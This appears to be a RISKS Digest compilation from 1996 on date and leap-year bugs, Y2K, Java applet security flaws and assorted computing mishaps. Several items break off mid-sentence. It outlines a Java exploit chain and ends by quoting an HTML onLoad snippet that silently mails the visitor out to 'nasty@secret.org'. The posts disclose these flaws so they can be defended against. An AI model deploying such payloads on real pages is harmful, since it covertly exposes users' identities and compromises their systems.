Note: For UK/US dates in the range 01-Jan-1901 to 31-Dec-2099 they work
fine.

A note to followup to Tom Dickens' message regarding
29 Feb 1996 errors in Excel (<A HREF="/Risks/17.83.html">RISKS-17.83</A>)
<P>
I use Lotus 1-2-3 Release 5 for Windows and Excel 5.0 on the MAC.
My tests revealed the following:
<OL>
<LI>	Lotus uses a "date number" system where Day 1 is  
January 1, 1900.  The following is a quote from the Lotus
Help file:
<P>
date number
<P>
A number from 1 through 73050 that 1-2-3 assigns in sequence to each
date from January 1, 1900, through December 31, 2099. For example,
the date number for July 21, 1991, is 33440.
<P>
Lotus has various number formats for dates including a
day-month-year format that shows today's date, for example,
as 05-Mar-96.  When one enters (or calculates) a date past
December 31, 1999, the format changes such that February 29,
2000 is represented as 29-Feb-2000.  If the column width is
set to accommodate a dd-mmm-yy format, one gets a string of
********* for dates past December 31, 1999.  Also, the @YEAR
function returns a value of 100 for a year 2000 date (@YEAR
returns 96 for a 1996 date).
<P>
These results may surprise spreadsheet users who have expectations
about the consistency of formatting and who do not understand
the convention that Lotus uses.  By the way, the maximum date
for Lotus is December 31, 2099 (date number 73050).
<P>
<LI>	The problems with 2/29 do not appear to occur in Mac 
version 5 of Excel.  It represents 2/29/2000 as
02/29/00 is nn-mm-yy format and returns a year value
of 2000 when the @YEAR function is applied.  The
@YEAR function returns 1996 for current year dates.
</OL>
Users who work with both Lotus and Excel should be
aware of the differences in how the two programs
handle dates.

After reading about the fact that Excel 5 assumes that there is a leap year in
1900, and so all its dates (recorded as days since 1/1/1900) are wrong, I was<BR>
struck by a horrible thought.
<P>
Ole Automation, the Windows inter-application macro programming interface,
uses data types based upon those of Microsoft's spreadsheets and Visual
Basic. One of these datatypes is a date. Did this "Date" type deal with the
leap year properly, or were apps using it meant to assume that 1900 was a
leap year for compatibility.
<P>
I bit of CD searching cam up with the following answer from from the Win32
SDK, Ole Automation, "Data Types, Structures, and Enumerations":
<P>
VT_DATE
<P>
A value denoting a date and time was specified. Dates are represented as<BR>
double-precision numbers, where midnight, January 1, 1900 is 2.0,<BR>
January 2, 1900 is 3.0, and so on. The value is passed in date. This is<BR>
the same numbering system used by most spreadsheet programs, although<BR>
some incorrectly believe that February 29, 1900 existed, and thus set<BR>
January 1, 1900 to 1.0.
<P>
So, modern apps are meant to assume that 1/1/1900 is really the second day
of the year/century, rather than the first so that from 1/March/1900 onwards
the value of a date calculated by a broken (assumes 29/Feb/1900 exists)
application and a non broken application is the same.
<P>
I can't decide if this is an elegant workaround of the problem or not...

chronic activity --- from the guise of the user. Multitasking
(and multiprocessing) systems have the intentional property that "daemons"
perform routine actions without the end-user's knowledge and perhaps consent.
<P>
There is a very good reason for this: If the user were asked to verify and
understand every subtle operation of an operating system or daemon process,
no useful work could ever be done. (Could you imagine having to answer for
a dialog box for every operation taking place on your system?)
<P>
Unfortunately, this problem is only going to get worse --- not better. As
personal computers and the operating systems that they run become more
complex, much more will be going on in the system "behind your back", and
you may never be aware of it. Most people are used to thinking of the PCs
on their desks as predictable boxes that only do what they are explicitly
told to do. MS-DOS and Mac operating systems aren't going to spawn spurious
processes on you to, say, initiate their own I/O or network activity.
<P>
This is, of course, something of a myth. Nearly all computers (regardless
of the power of the O/S) are capable of performing "asynchronous" activity
which is unknown to the user. These functions are both necessary and
desirable in nearly all systems. Examples include:
<UL>
<LI>Timer interrupts, and anything latched to them (say, TSRs under
MS-DOS).
<LI>Time-based scheduling of processes, such as those spawned by
the UNIX 'cron' and 'at' mechanisms.
<LI>Any sort of network server process, e.g., an FTP or telnet daemon
which responds to stimuli from the "outside world".
<LI>Administrative programs which, say, monitor the system for
viruses or perform quota services.
<LI>Viruses themselves, and all manifestations (e.g., "surprise"
programs embedded in Microsoft Word documents).
</UL>
Computers only give the end-user the perception that he or she is in
control. In reality, the operating system and all of the applications are
in control. Computers and applications present an interface which implies
causality. But I'm sure we've all seen enough Trojan Horses to know that
this is but an illusion.

I came into work today to find e-mail waiting in my in-box from someone who
had clearly reached their frustration point with their bank.
<P>
It appears that this person [who will remain nameless] has had a great deal
of difficulty with some banking and credit card services for the Bank of
Hawaii.  It just so happens that I am the owner of the BOFH.COM domain,
which I use.  This person sent me copies of all of his past correspondence
with the bank, including his home telephone number, his VISA number and
credit line.  Now, being a relatively nice guy (and completely against the
spirit of the domain ;) I sent him a polite note informing him of his
mistake.
<P>
I believe the risks are obvious, but here are a few I can think of:
<OL>
<LI> The large number of "novices" on the internet that think they
understand the naming schemes for companies.
<LI> The complete lack of knowledge of whois, which would have shown
him that the domain certainly did not belong to the Bank of Hawaii.
<LI> Unsecured transmission of credit card numbers to people who have
no legitimate need for them.
<LI> Assuming that all business can be deal with via the Internet.
</OL>
[P.S.  My new Alpha PC with the 20 gigabyte storageworks should be
here once his credit-card company approves it.  ;)]

The risk?  Virus detection programs typically won't help at all in detecting

<P>
As a result of a SMOP (small matter of programming) resulting from a few
missing keystrokes that would have properly defined the recipient list,
about 11,000 out of 13,000 of Chase Manhattan Corp.'s secured credit-card
customers received a letter intended for just 89 customers -- informing them
that their accounts were in default and could not be converted to unsecured
accounts.  The screwup was blamed on an outside firm that administers the
secured card program.  Chase is apologizing.  [Perhaps the apology letter
will also go to the 89, using the same mailing-list glitch? (Sorry.  That
was a semi-snide RISKS-related comment from PGN.)]
<P>
``The incident shows how quickly relatively minor errors can balloon into
big problems as financial services firms use computers to send hundreds of
thousands of notices to customers almost instantaneously.  Vanguard Group,
the big mutual fund company, recently mailed incorrect tax-preparation
materials to more than 5 million fund shareholders that could force
customers to amend their federal income tax returns. In 1994, Fidelity
accidentally reneged on a promise to pay investors a year-end dividend.''

*The Boston Globe* (7 Mar 1996) reports that the scheduling computers of the<BR>
Harvard Pilgrim HMO ``broke down" on 4 Mar 1996 and are not expected to be
available until Saturday.  Patients needing to make appointments must wait
until the computers are available; urgent care patients are being seen
immediately.  The medical records system, as well, was down for seven hours
on 6 Mar.

Harvard Pilgrim declined to specify the cause other than to say that it's a
standard database problem, although requiring an intricate process to solve
it.  The full story can be retrieved from the Globe's web site:

<P>
The web page of the week in the most recent Information Week is
www.switchboard.com.  It is a compilation of the telephone white pages from
all across the nation.  You can search on combinations of last name, first
name, city and state to find long lost friends, relatives or just
interesting names.  (A quick search found a Santa Claus in FL and a Bunny
Easter in WA.)
<P>
This kind of information is not particularly new, of course.  What is
interesting is that Switchboard allows you to register by identifying your
listing and sending your email address.  They send back a password.  Now you
can login and add or modify information in your listing or even make your
listing "unlisted".  It is clearly a very easy thing to use throwaway email
addresses to modify any number of listings.  Switchboard admits as much in
their policy statement (<A HREF="http://www2.switchboard.com/policy.htm">http://www2.switchboard.com/policy.htm</A>) saying that
their security is "designed to discourage" such impersonation.  They will
correct any falsification with appropriate documentation and take steps
(this seems to mean blocking access from the offending email address) to
prevent additional occurrences including, if applicable, legal action.  (I
fear there is very little substance behind that claim.)
<P>
Despite Switchboard's benevolent claims, the possibilities make me nervous.
<P>
I should note that when a listing has been modified by a user, it appears
with an asterisk.

<P>
In <A HREF="/Risks/17.85.html">RISKS-17.85</A>, Li Gong talks about the Risks of running an applet of
questionable parentage as ones self.  In this context, he makes two related
statements that I would like to address:
<OL>
<LI>Such an applet, unless its authenticity can be verified to the
satisfaction of the downloading client, should instead run within
a confined (protected) sub-domain, and any further invocations
from this code should also run within this sub-domain.
<P>
<LI>Most machines and OSs obviously do not support such confined domains.
</OL>
I absolutely agree with the first statement.  If you are going to run
software (applet or otherwise) of questionable intent, you should be sealed
off into a domain from which your process or any of its descendents cannot
escape.
<P>
It is the second statement I wish to address. Data General's DG/UX operating
system (with DSO, an additional security option) provides exactly this
protection and for exactly the reason Li Gong points out (among other
reasons).  When a user first authenticates to the system (e.g., logs in), a
session is created.  Sessions are authorized for some number of sub-sessions
(n &gt;= 1).  The session establishes a maximum set of credentials for any
sub-sessions (i.e., a master domain).  The credentials establish what a
process can see and do *and* provide hard and fast limits for what any
descendent processes can do.  Within this context, each sub-session has its
own domain which is more restrictive than the master domain.
<P>
So, for the scenario under discussion, a user might log in and begin
performing their regular activities on the system (which might even include
administrative duties).  If a desire or need to surf the Net strikes them, a
new sub-session is established with a very restricted set of credentials.
Presumably, a site would be configured such that normal sessions did not
have access to any Web browsers.  The new sub-session would pick up the
privilege to run the browser while simultaneously giving up access to
virtually all information and other privileges on the system.  This is
assuming the master domain permits such actions. Then, and only then, the
user could find and run Java applets.  Regardless of what the applet tried
to do or have other programs do on its behalf, the browser sub-session would
be severely limited in what it could access or affect.
<P>
I hope this hasn't sounded too much like a commercial, but I did want to
point out that there are operating systems that take this sort of thing
*very* seriously and are actively working to provide the necessary<BR>
protections and assurances.

Li Gong's article in <A HREF="/Risks/17.85.html">RISKS-17.85</A> postulates that the flaw which David
Hopwood uncovered in Java is really a feature.  It really is a serious bug.
Java was designed to only use local classes which are part of its CLASSPATH
(usually an environment variable).  Here's a very real example of a
situation where Mr. Hopwood's bug could cause a user to unknowingly delete
every file on their hard disk, by simply browsing a Web page!
<OL>
<LI>Victim browses Attacker's Web page.  Web page entices victim to submit a
form with their e-mail address.  Actually, a bug in JavaScript, in Netscape
2.0, can be exploited to automatically determine the user's e-mail address.
<P>
<LI>Attacker postulates or determines from message headers that Victim uses
Eudora mail, and sends Victim a message with Mr. Hopwood's two attack files
as binary attachments.  Eudora automatically unpacks attachments and places
them into its directory.  Attacker assumes that Eudora is installed in a
"standard place", i.e. the installation default.
<P>
<LI>Victim now switches to another Web page on attacker's site, which
exploits the bug.  This allows the two attack files to be loaded, and
bypasses all of Netscape's Java security restrictions, allowing attacker to
do whatever they want to user's machine.
</OL>
Another possibility for getting the files onto the victims machine include
anonymous FTP (if the victim runs an FTP server).  All the attacker has to
know is the directory in which the files are stored.

In fact it is more serious than I had first thought.
<P>
The locations of files in Netscape's cache are predictable. By using a known
security bug in JavaScript, it may be possible to arrange for downloaded
files to be cached using a path and filename known to the attacker.
<P>
Although I haven't implemented an attack based on this, it is probable that
it removes the requirement for the Loader and dynamic library to have been
installed in advance, if Netscape's cache is enabled.

The bug I found loads applets using the built-in class loader, and so the

<P>
The Netscape browser appears to be secure in this respect, but the online
Java tutorial (draft version) seems to suggest that the security behaviors
may be dependent on the specific browser, rather than being intrinsic in
Java.  Following is a direct quote from the tutorial.  Note particularly the
first point under "things ... that you might not expect".
<P>
[Draft Java online tutorial excerpt follows:]
<P>
What Applets Can and Can't Do
<P>
For security reasons, an applet that's loaded over the network has
the following restrictions:
<UL>
<LI>It can't load libraries or define native methods.
<LI>It can't ordinarily read or write files on the host that's
executing it.
<LI>It can't make network connections except to the host that it
came from.
<LI>It can't start any program on the host that's executing it.
<LI>It can't read every system property.
<LI>Windows that an applet brings up are distinguished by some
warning text and either a colored bar or an image, so that
the windows don't look like they're part of a trusted application.
<P>
Things that applets can do, that you might not expect:
<P>
<LI>Applets that are loaded from the local file system (from a
directory in the user's CLASSPATH [or from a file URL?]) have
none of the restrictions that applets loaded over the network
do (as listed above). For this reason, some browsers don't
allow applets to be loaded via file: URLs.
<LI>Although most applets stop running once you leave their page,
they don't have to.
</UL>
Each browser has a SecurityManager object that checks for applet
security violations. When a SecurityManager detects a violation,
it throws a SecurityException. [ need an example applet that tries
to do a few forbidden things ]     [Reminder: this is a draft.  PGN]

Another (possibly minor) risk of Java is implicit in its nature - it allows
someone else to run a program on your system.  If I wanted to do something
like, say, set up a system to break encryption keys, my best way to get the
needed processing power might be to build a Java applet that would do a
small amount of the processing needed, then send the result back to me and
wait for another 'assignment.'  If I then proceeded to build an attractive
Web site, I could drop that applet to anyone visiting my site and simply sit
back and wait for results (which I'd need to refine).
<P>
I as the user might never notice this, but there'd be at least a small
decrease in the resources available to me on my system, most notably a lack
of available processing power.  Depending on how the applet was written and
whether it could detect other instances, my system might proceed to get
slower and slower each time I visited the site in question.  Would I notice
this, or would I just chalk it up to overloaded servers and wonder later why
my system was so sluggish?
<P>
There are a variety of other possible attacks based on this as well, which
might or might not work depending on the capabilities of Java.  Other
possibilities include file 'storage', with small files being sent for
storage and returned before the applet would exit for a shutdown and
Miller's Migrating MUD, with a small private MUD/chat system being run on
someone else's system, with only an address at a fixed site.

Read Larry Niven's short story, "Flash Crowd", and its two sequels.  These
deal with the problems that occur given an instantaneous transportation
system (the fictional part), modern communication, and especially the
accident "rubbernecker" instinct.  Instant Woodstocks, or instant riots?
Note for the science-fiction-impaired: Niven's teleportation stories aren't
so much about teleportation, which he himself doesn't believe can be
feasible [see his essay "Theory and practice of teleportation"], as about
what would happen to society if it *could* exist, along the same lines of
what happened to society with the telephone, the auto and highway system,
etc.

<P>
Starting in the 1970's we have had to add occasional leap *seconds*
to keep our official time in sync with the Earth's rotation. A leap second
is a 61st second in a minute (always just before UT midnight), so that some
date specifications such as "23:59:60 Dec 31 1972" are actually perfectly
valid.  This has worked reasonably well so far, but I've read predictions
that within only a couple of decades we'll first start needing leap seconds
every year, then twice a year, then even more and more often as the Earth
slows down... (Note also that the Earth doesn't only slow down, it can
sometimes speed up as well as our moment of inertia changes due to
redistributions of atmospheric mass! To my knowledge we haven't yet needed
an "anti leap-second" but it is bound to happen eventually.)
<P>
What shall we do then? Redefine the second? Keep two separate time
standards, one with a fixed second and another with a stretchy second that
changes to accommodate the Earth? There is already something called
"Ephemeris time" that has been steadily diverging from standard time since
1900.
<P>
Another source of confusion is technical terms that mean different
things in different fields. Geophysicists have appropriated the astronomical
terms "Julian Day" and "Sidereal Year". The only trouble is they use
"Julian Day" to mean day number in the current year, and "sidereal year"
to mean tropical year!

<P>
Recent postings have discussed the various algorithms used to calculate leap
years, and the switching on and off of summer time (daylight saving time). A
couple more thing to bear in mind (thanks to Steve Allen of UCO Lick
Observatory, &lt;<A HREF="mailto:sla@ucolick.org">sla@ucolick.org</A>&gt; ).
<P>
The length of day (LOD) will be increasing for the next few hundred million
years.  This is due to tidal drag.  The exact amount of this increase in LOD
is not yet certain because it cannot be calculated from simple physics; it
must be measured and the tidal component painstakingly distinguished from
the contributions of the changing currents in the fluid core of the earth
and the angular momentum of the atmosphere and oceans.
<P>
The length of the year (LOY) is not changing in such a long-term
secular fashion.  Unless there is a fifth force or the fundamental
constants of nature are changing as the universe ages, the size of the
earth's orbit is pretty much fixed.  There are subtle changes due to
the other planets, but viewed over the long term these are mostly
periodic.
<P>
For these orbital time periods you will find polynomial expressions (usually
cubic) for their length.  These expressions are the ones upon which
Herschel's calculation of the proposed 4000-year leap are based.  The most
common expressions found in available literature are the cubic ones
calculated by S. Newcomb at the beginning of this century.  Those
expressions are based on roughly 300 years of accurate observations.  For
that reason, it is a mistake to extrapolate those cubic polynomials more
than about 300 years into the future.  The cubic is really only the leading
terms of a cyclical trigonometric series.
<P>
Even now, with another century's worth of data under our belts, and with the
milliarcsecond accuracy with which we now know the positions of the inner
planets, I think it might be a mistake to try to resolve whether the
Herschel 4000-year term should be added to the calendar.  Discriminating
between the different schemes of the Gregorian and Eastern Orthodox
calendars might be possible, but it would depend on how accurately you think
you can predict the earth's rotation, and that depends on your ability to
predict the weather in the earth's core."
<P>
So there isn't much point in trying to be too accurate about the number of
days in a year! The variation in the length of the day is the prime reason
for the introduction of leap seconds, which attempt to stop the calendar
getting too far adrift from real (atomic) time. Leap seconds, at present,
are not appearing in a predictable fashion, but as and when they are needed.
<P>
For computer system designers, here are some possibly helpful guidelines:
<OL>
<LI>For a 'time base', count seconds (or microseconds) from some datum,
preferably using a Cesium clock. These are available by radio in many parts
of the world.
<P>
<LI>A minute can have 59, 60, or 61 seconds.
<P>
<LI>February can have 28 or 29 days.
<P>
<LI>The rules for converting from a seconds count to a date and time are
arbitrary, complex, and subject to change at short notice! However, changes
to the rules are not (?) retrospective.
</OL>
Any neat little C one-liners are going to be wrong at some point. Maybe an
ideal solution is a Java applet downloaded from the custodian of the legal
calendar each time a conversion is needed? (;-)xxxxxxxxxx

I've heard (but never actually found a source) that this 4000-year
correction is in the standard Soviet calendar.  The Greek Orthodox church's
calendar (which I think is the official standard in Greece) replaces the
400-year rule by the rule "century divided by 9 gives a remainder of 2 or<BR>
6".  This is more accurate than the Gregorian calendar, but agrees with it<BR>
on the years 2000 and 2400.
<P>
Since the Greek Orthodox church is prevalent in Russia too, it seems the
Russians have until 2/28/2800 to make up their minds which calendar they're
using...  :-)

Let's just leap from December 31, 1999 straight to January 1, 2001.  That
will eliminate not only any question about whether 2000 is a leap year, but
also the arguments about when the twenty-first century begins.  Of course
some data processing software may need a bit of tinkering to know how to
count the number of years when spanning century boundaries...

As far as I know all CODASYL definitions up to and including COBOL-85 define
the receiving field from
ACCEPT variable FROM DATE
which is used to read the system date, as a 6-digit field (PIC 9(6)) that
holds yymmdd.

The risk is obvious -- no system compiled with a standard COBOL compiler can
deal with the turn of the century without explicit date manipulations being

Many of the most popular real-time clock chips only hold the year as two
digits and do not make provision for a century. As a consequence quite a few
operating systems (including UNIX, via the ANSI C time_t structure) do not
return the century as a separate field in their system time structures.
Although time_t.year is not limited to two digits I suspect that it will not
exceed 99 in practise if the clock chip used in the box doesn't have a
century counter.
<P>
The risk? Same as described for COBOL.

<P>
The San Jose Mercury News for 7 March 1996 carries an AP story with the
above headline, and the subhead ``Schools' coding error mislabels minor
offenses as major troubles''.  The article reports that two teachers kicked
student Garret DeVore out of their classes at Monte Vista High School,
apparently in Danville CA, and the football coach benched him for the entire
year, because his computerized disciplinary record from the middle school he
previously attended was misunderstood to say that he had 4 drug busts and
several other serious violations.  As many as 9 other students may have been
suffered similarly.
<P>
5 of the 78 computer codes used for discipline cases at Los Cerros Middle
School are assigned different meanings at Monte Vista.  For example, the
code for swearing at the middle school means theft at the high school.
Garrett's actual violations in the middle school were gum-chewing,
tardiness, and one instance of throwing rocks over a fence.  (Why the
teachers and coach were punishing a student for what they thought he had
done in past years at another school, instead of acting only on the basis of
his conduct in their classrooms and on their team, is a topic for some other
newsgroup, perhaps one in the k12 hierarchy, although I suspect relevance
for the problem of recividism among convicted criminals as well.)
<P>
This is not *entirely* a computer risk, since abbreviated notations in a
paper file can also be misunderstood, with the added potential for
misreading someone's poor penmanship.  Further, such manual notations are
less likely to be effectively standardized than values in computerized
records.
<P>
However, a tradition which perhaps made sense in the days of 80-column
punchcards, but is foolish in the era of $200 1-GB disks, encourages some
designers of automated information systems to encode data as compactly as
possible: would anyone with MIS experience care to wager that with 78 kinds
of violations to record, the type of violation is recorded at these schools'
computer systems in a single byte, with most of the displayable ASCII
characters assigned arbitrary, non-mnemonic meanings?  If my guess is
correct, the lack of redundancy makes misinterpretation easy.
<P>
With modern cheap storage media, room for say, a 16-letter string instead of
a single-letter code would make it hard to misconstrue "tardiness" as "drug
abuse", even after the record is transferred with the student to another
school, where the set of recognized violations may be different.  The data
input routines could still enforce a standard set of values, if
administrators judge that to be necessary for statistical or other purposes,
by requiring selection of the string from a menu of compiled-in values,
perhaps using something similar to the disambiguator in the Macintosh
standard file package, rather than permitting free-form typing.
<P>
Language bigots will blame it all on COBOL, and claim that the built-in
support for association lists in LISP (or another feature in another
language) would have made a good solution more likely in their favorite
language, but the real problem is bad design, not the language chosen for
implementation.  Was it Edsger W. Dijkstra who pointed out that there has
never been, and will never be, a programming language it which it is
difficult to write a bad program?

More information on the security bug described in <A HREF="/Risks/17.84.html">RISKS-17.84</A> - <A HREF="/Risks/17.86.html">86</A>, which
can be used to allow Java applets to load native methods without any
security restrictions:
<P>
The attack normally requires two files to be pre-installed in a directory
readable by the client. However, in a previous article, I mentioned that
it may be possible to automatically load these files into Netscape's cache.
Having done a little more testing, it turns out that this is feasible
under Windows 95 and NT (but not under Unix). This version of the attack
also makes use of a known bug in JavaScript.
<P>
In other words, for Netscape on Win32, it is not necessary for any files
to be pre-installed. Applets can run arbitrary code with the permissions
of the user, simply by the user viewing an attacker's web page.
<P>
The only reliable way to avoid this bug at the moment is to disable Java -
in Netscape this is done by selecting 'Disable Java' in Options -&gt; Security
Preferences.

Assigning a "nobody" or guest UID to applications from the net does not
solve the security problem. I could for instance be the only or one of a few

The solution to the leap-&lt;list goes here&gt; challenge may be to become less
obsessed with time and to make our computers less obscessed with it as well.
<P>
There are cases when time is critical - for example in space shots and
military targetting.  In these cases, it might be more useful to deal with
time in terms of rotations of an electron since the big bang (which for the
purposes of universal harmony work will be set to an arbitrary constant
time/space reference).  Of course that means we have to make corrections for
where we are in space (since time travels at the speed of light).  So let's
all set our atomic clocks in 3 - 2 - 1 seconds to 0 rotations UFT (Universal
Fred Time) - offset of course by the time delay caused by your spatial
distribution - and don't forget to compensate for your relative velocities
and accelerations!
<P>
Now on to the latest rumor from the virus mills.  Apparently, the Word macro
viruses are now so successful that they are soon going to surpass (or
perhaps already have surpassed) all other viruses in terms of the number of
infected systems.  Apparently people share word files far more than they
ever shared floppy disks, and since attachments with Word documents are now
common in email, the Internet is now a major vector for the spread of
viruses (I told you not to believe that email was safe).

<P>
Long before the official incident report will be available, and even some
time before the data recorders have been fully analysed, a spokesperson of
German Ministry of Transportation reacted to media questions yesterday
(Thursday March 7, 1996) in *assessing the responsibility of the
pilot-flying* for the Birgen Air B757 crash at Puerto Plata, killing 189
people. According to this spokesperson, it is clear from first voice
recorder findings that the captain knew about the erroneous velocity
indication on his instrument when he had accelerated up to 80 knots on the
runway; at this time (and well before he reached the decisive velocity vr,
about 135 knots) he should have interrupted the start, following safety
regulations which require ALL relevant instrumentation to work properly.
According to Ministry of Transportation, the pilot having not observed this
basic rule is guilty, independent of any further finding concerning the
final fate of the flight. This statement was seconded by a spokesperson of
Cockpit, the German pilot union.
<P>
Usually, official comments are given only *after publication* of official
reports. These comment of transportation ministry was immediately commented
as "premature" by Mr. Schuberth, chief officer of the German Airworthiness
Authority Flight Incident Analysis office (Flugunfall Untersuchungs-Stelle,
FUS im Luftfahrt-Bundesamt, LBA). In several German media, he is quoted to
have warned about this reaction as "improper" ("unanstaendig" which also may
be translated as "indecent").
<P>
Indeed, data have now been read from both VCR and DFDR (voice and digital
flight data recorders). The next round to interpret findings will start next
week (Monday March 11,1995), with experts from NTSB and German FUS-LBA.
Only after a careful analysis of the data recorded including simulation of
plane behaviour under the circumstances given, an assessment about the
causes of the incident and responsibility of pilots will be possible, as Mr.
Schuberth concluded.
<P>
Concerning the velocity indication, besides the indicators in both the
pilot`s and copilot`s instrument (which are fed by 3 independent meters
which may be switched between the visual indicators), there is a mechanical
("traditionally working") instrument indicating speed, height, compass and
radio, as further backup. Independent of all safety rules, a failure of a
single instrument may be only ONE of several causes contributing to this
incident.
<P>
Concerning other contributing factors, some speculations may even be
excluded even at this time. As the plane had not passed through a rain
shower (when reaching its final height of 7,200 feet, the rain cloud was
still ahead), possible engine flame-out (as sometimes experienced in earlier
crashes) can be excluded. Moreover, DFDR data seem to indicate (according to
a telephone conversation with captain Schuberth) that the autopilot had been
switched off; consequently, Pilot Induced Oscillations (PIOs) which had been
a contributing factor to several previous incidents can also be excluded.
<P>
Before any further speculations, official and non-official experts are well
advised to refrain from further speculations.

&gt;Subject: CIA &amp; NSA run remailers (fwd)
<P>
I attended last week's ``Information, National Policies, and International
Infrastructure" Symposium at Harvard Law School, organized by the Global
Information Infrastructure Commission, the Kennedy School, and the Institute
for Information Technology Law &amp; Policy of Harvard Law School.
<P>
During the presentation by Paul Strassmann, National Defense University, and
William Marlow, Science Applications International Corporation, entitled
``Anonymous Remailers as Risk-Free International Infoterrorists'', the
question was raised from the audience (Professor Charles Nesson, Harvard Law
School) -- in a rather extended debate -- whether the CIA and similar
government agencies are involved in running anonymous remailers, as this
would be a perfect target to scan possibly illegal messages.
<P>
Both presenters explicitly acknowledged that a number of anonymous remailers
in the US are run by government agencies scanning traffic.  Marlow said that
the government runs at least a dozen remailers and that the most popular
remailers in France and Germany are run by the respective government
agencies in these countries.  In addition, they mentioned that the NSA has
successfully developed systems to break encrypted messages will less than
1000-bit [public] keys and strongly suggested using at least 1024-bit keys.
They said that they themselves use 1024-bit keys.
<P>
I ask Marlow afterwards if these comments were off or on record, he paused
then said that he can be quoted.
<P>
So I thought I pass that on. It seems interesting enough, don't you think?

Causes can extend even to minor, non-disasters.  The Seattle area
experienced a small earthquake a year or so ago; in the metropolitan area it
was barely above the threshold of human detection.  The telephone system
became quite unusable for a time, with long delays for dialtone, apparently
because half of the city picked up the phone to ask the other half, "Hey!
Did you feel that?"

I think the risk is more general than just disaster situations. In NZL,
small town telecom systems are regularly taken down (with loss of access to
emergency services for the general population) when two local radio stations
choose to run phone-in competitions at the same time.

Although length of day is getting longer, it is 8 millionths of a second
shorter than it would be due to the 10 trillion tons of water stored in
reservoirs in the northern hemisphere over the last 40 years [15 Dec 96
Geophysical Research Letters].  Because the water isn't stored
symmetrically, it has pushed the earth's axis about 60 centimeters from the
North Pole toward western Canada.  The RISK certainly seems big.  According
to the author, reservoirs are the only human activity big enough to cause an
appreciable change in these global phenomena.
<P>
Like an ice skater pulling in their arms, we could get rid of those leap
seconds from the earth slowing down if moved enough water away from the
equator.  Make programming those real time applications easier ;)

&gt; Although time_t.year is not limited to two digits I suspect that it will not<BR>

&gt; century counter.
<P>
Nope. The problem is worse.
<P>
UNIX holds the time internally as the number of seconds since 1970-01-01.
"struct tm" is just a library abstraction. IMHO, if the library is changed
to return a four-digit date instead of modulo 100, not much will break --
typical Unix software frequently says "if year &lt; 1900 year += 1900" or some
such.
<P>
There are in fact three things you can do:
<UL>
<LI>drop the modulus nonsense and return the year in full,
<LI>just subtract 1900, so that the above algorithm continues to work,
<LI>return % 100, as before.
</UL>
IMHO the first method is preferable, the second is most compatible, and the
third just plain stinks. Linux libc uses the second method.
<P>
A different and far worse risk is that on system boot the Unix box is going
to have to read the clock chip and set its internal time from it, and it
doesn't take any esoteric powers to predict that this _will_ fail on quite
a few OSes.

FINAL CALL FOR PAPERS<BR>
NEW SECURITY PARADIGMS '96
<P>
A workshop sponsored by ACM SIGSAC and the Aerospace Institute<BR>
and supported by the Department of Defense and TRW
<P>
UCLA Conference Center<BR>
Lake Arrowhead, CA<BR>
16-19 September 1996
<P>
Paradigm shifts disrupt the status quo, destroy outdated ideas, and open the
way to new possibilities.  This workshop explores radical new models for
computer security, such as strategies for securing very large networks,
providing software safety in large systems, and developing ethics in
international cyberspace.  The goal is to develop transcendent solutions
that provide the flexibility and interoperability users require in trusted
systems.
<P>
We offer a creative and constructive workshop environment for about 25
participants at the beautiful UCLA Conference Center on lake Arrowhead in
the San Bernardino Mountains, California.  Dress is casual.  The tone is
exploratory rather than critical.  The refereed papers will be printed in a
workshop proceedings.  To participate, submit either a research paper or a
5-10 page position paper, preferably via email, to Program Chairs Catherine<BR>
Meadows and David Bailey at the email addresses listed below by April 1,
1996.  Alternately, submit five copies of a hard-copy paper to either<BR>
program chair by 24 March 1996.  The Program Committee will referee the
papers and notify authors of acceptance status by 9 June 1996.
<P>
Scholarships are available.
<P>
As it becomes available, more information will be provided on-line.

<P>
The following article, accompanied by a photograph of the two women,
appeared in *The Sunday Mail* in Queensland, Australia, on March 10, 1996:
<P>
Hey, Belinda, meet Belinda
<P>
They could not look more at odds, but these two women are "twins" locked in
a bureaucratic nightmare.  Banks, building societies, government agencies,
the Electoral Commission and even the local library cannot tell them apart.
When one went for a loan, the other found her credit cancelled. When one
enrolled in university she was offered the other's completed degree.  Though
one is an Aborigine with melting dark eyes and curly brown hair and the
other a straight-haired, blue-eyed blonde, computers across Australia refuse
to accept they are not one and the same person.
<P>
The problem is not simply that they bear the identical name: Belinda Lee
Perry. Even more uncannily, B1 and B2 have the same date of birth January 7,
1969.  The two Belindas stretch the bounds of mathematical probability.<BR>
Sports betting agency Centrebet figures the odds against such a biographical
collision are five million to one.
<P>
The first time blonde Belinda suspected she might have a double was back
when she was still in high school.  A mix-up at the Medicare office had her
with a broken arm instead of an injured hand.
<P>
The next problem arose when blonde Belinda, who was born and raised at Caves
Beach near Newcastle in NSW, tried to claim social security benefits. The
CES [Commonwealth Employment Service] already had her on the books.
<P>
The following year the other Belinda joined the City of Sydney library and
suddenly her namesake found her library card cancelled because the computer
recognised only one Belinda Lee Perry.  Blonde Belinda then had her name
struck off the electoral roll after the other Belinda changed address.
<P>
But brunette Belinda also had problems.  She had applied for an Abstudy
(Aboriginal Studies) grant and was informed she already had an Austudy loan.<BR>
Later she was sent a bill for $3000.  And blonde Belinda has been unable to
transfer her Visa card to another bank because of the "twin" mix-up.  But,
despite the difficulties, the two women hit it off from the moment they met.
"It's like we're related," they both said.
<P>
[The risk? With an Australian population of around eighteen million, and<BR>
odds of one in five million, where is the *third* Belinda Lee Perry born<BR>
on January 7, 1969?  TM]

I read somewhere that the chances of winning the lottery are the same
whether you enter or not.  According to a report in the Irish Times
(February the 24th -- I get mine sent to me in Munich) a man is suing the<BR>
National Lottery for payment of 250 000 Irish pounds (nearly 400 000 US
dollars) because his winning lotto panel was not entered into the system.
The man submitted 32 panels of numbers, but one of the panels was entered
twice, so the winning panel was left out.  He has little chance of winning
his case, as each lotto receipt bears the warning "Before leaving the Lotto
agent's premises, check the numbers on your tickets..."
<P>
The risk?  People forget that the probability of the agent miskeying your
numbers is much greater than the probability of winning the lottery, even
(especially?) if you submit 32 panels at once.  The best way to avoid the<BR>
risk is not to play, of course.  I'm waiting patiently for a (misaddressed)
lotto cheque to drop in my mail box any day now...

I noticed, while loading a web page, that there was a mailto: URL active
(using the "Easter Egg" Ctrl-Alt-T popup to see active URLs).  Sure enough,
after I cancelled that and examined the source, I saw something like this:
<P>
&lt;body onLoad="document.mailme.submit()"&gt;<BR>
&lt;form method=post name="mailme" action="mailto:<A HREF="mailto:nasty@secret.org">nasty@secret.org</A>?subject=gotcha"&gt;<BR>
&lt;input type=hidden name="hi" value="there"&gt;<BR>
&lt;/form&gt;
<P>
A quick test on my local machine shows that this will send a message to
